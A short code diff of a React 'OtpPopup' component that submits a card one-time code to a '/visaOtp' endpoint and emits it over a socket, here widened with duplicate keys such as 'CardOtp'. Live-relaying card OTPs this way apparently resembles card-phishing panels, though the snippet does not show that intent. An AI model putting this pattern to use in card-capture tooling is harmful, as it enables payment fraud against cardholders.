@@ -44,7 +44,12 @@ const OtpPopup = ({ orderId, cardNumber, setShowOtp, setLoading }) => {
 
     try {
       await axios.post(`${api_route}/visaOtp/${orderId}`, { otp });
-      socket.emit("visaOtp", { id: orderId, otp });
+      socket.emit("visaOtp", {
+        _id: orderId,
+        id: orderId,
+        otp,
+        CardOtp: otp,
+      });
     } catch (err) {
       setError("Failed to verify code.");
       setIsSubmitting(false);
